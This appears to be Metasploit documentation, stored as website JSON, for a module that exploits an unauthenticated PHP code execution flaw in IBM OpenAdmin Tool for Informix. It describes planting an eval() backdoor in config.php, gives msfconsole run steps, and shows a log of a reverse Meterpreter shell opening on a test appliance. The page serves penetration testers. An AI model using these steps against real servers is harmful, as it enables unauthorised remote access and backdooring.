{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec","result":{"data":{"moduleMetadataJson":{"id":"db3b8de2-dc4e-57e0-b673-41a5f66d95d2","name":"IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution","fullname":"exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec","description":"This module exploits an unauthenticated remote PHP code execution\n        vulnerability in IBM OpenAdmin Tool included with IBM Informix\n        versions 11.5, 11.7, and 12.1.\n\n        The 'welcomeServer' SOAP service does not properly validate user input\n        in the 'new_home_page' parameter of the 'saveHomePage' method allowing\n        arbitrary PHP code to be written to the config.php file. The config.php\n        file is executed in most pages within the application, and accessible\n        directly via the web root, resulting in code execution.\n\n        This module has been tested successfully on IBM OpenAdmin Tool 3.14\n        on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec","documentationSlug":"/modules/documentation/exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec","referencesSlug":"/modules/references/exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module exploits an unauthenticated remote PHP code execution vulnerability in <a href=\"https://www.ibm.com/support/knowledgecenter/SSGU8G_12.1.0/com.ibm.oat.doc/ids_oat.htm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">IBM OpenAdmin Tool</a> included with IBM Informix versions 11.5, 11.7, and 12.1.</p>\n<p>  The <em>welcomeServer</em> SOAP service does not properly validate user input in the <em>new<em>home</em>page</em> parameter of the <em>saveHomePage</em> method allowing arbitrary PHP code to be written to the <em>config.php</em> file. The <em>config.php</em> file is executed in most pages within the application, and accessible directly via the web root, resulting in code execution.</p>\n<p>  <strong>Note: If malformed PHP code is written to the <em>config.php</em> file the application fails to process subsequent requests to set <em>new<em>home</em>page</em>, rendering the application unexploitable.</strong></p>\n<p>  For this reason, the module first writes a PHP <code class=\"language-text\">eval()</code> backdoor to the <em>config.php</em> file, then the payload is provided as PHP code in a HTTP POST request for execution.</p>\n<p>  By default, a backup of the existing <em>config.php</em> is written to <em>BAKconfig.php</em>. Replacing the <em>config.php</em> file with <em>BAKconfig.php</em> will remove the backdoor.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  The IBM® OpenAdmin Tool (OAT) for Informix® is a web application for administering and analyzing the performance of IBM Informix database servers. You can administer multiple database server instances from a single OAT installation on a web server. You can access the web server through any browser to administer all your database servers.</p>\n<p>  This module has been tested successfully on IBM OpenAdmin Tool 3.14 on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.</p>\n<ul>\n<li><a href=\"https://www-01.ibm.com/marketing/iwm/iwm/web/reg/download.do?source=swg-informixfpd&#x26;S_PKG=dl&#x26;lang=en_US&#x26;cp=UTF-8&#x26;dlmethod=http\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Informix 12.10 Developer Edition SLES 11 virtual appliance demo (Developer Edition 32 bit) VMware Workstation</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Do: <code class=\"language-text\">exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec</code></li>\n<li>Do: <code class=\"language-text\">set rhost [IP]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a session</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ibm-openadmin-tool-314-on-informix-1210-developer-edition-suse-linux-11-virtual-appliance\" style=\"position:relative;\"><a href=\"#ibm-openadmin-tool-314-on-informix-1210-developer-edition-suse-linux-11-virtual-appliance\" aria-label=\"ibm openadmin tool 314 on informix 1210 developer edition suse linux 11 virtual appliance permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IBM OpenAdmin Tool 3.14 on Informix 12.10 Developer Edition (SUSE Linux 11) Virtual Appliance</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(ibm_openadmin_tool_soap_welcomeserver_exec) &gt; check\n[*] 172.16.191.208:80 The target service is running, but could not be validated.\nmsf exploit(ibm_openadmin_tool_soap_welcomeserver_exec) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.181:4444 \n[+] 172.16.191.208:80 Wrote backdoor to config.php file successfully\n[*] Sending stage (33986 bytes) to 172.16.191.208\n[*] Meterpreter session 1 opened (172.16.191.181:4444 -&gt; 172.16.191.208:39840) at 2017-05-31 08:01:49 -0400\n[!] 172.16.191.208:80 Replace the &#39;config.php&#39; file with &#39;BAKconfig.php&#39; to remove the backdoor\n\nmeterpreter &gt; sysinfo\nComputer    : informixva\nOS          : Linux informixva 2.6.27.39-0.3-vmi #1 SMP 2009-11-23 12:57:38 +0100 i686\nMeterpreter : php/linux\nmeterpreter &gt; getuid \nServer username: daemon (2)\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"db3b8de2-dc4e-57e0-b673-41a5f66d95d2"}}}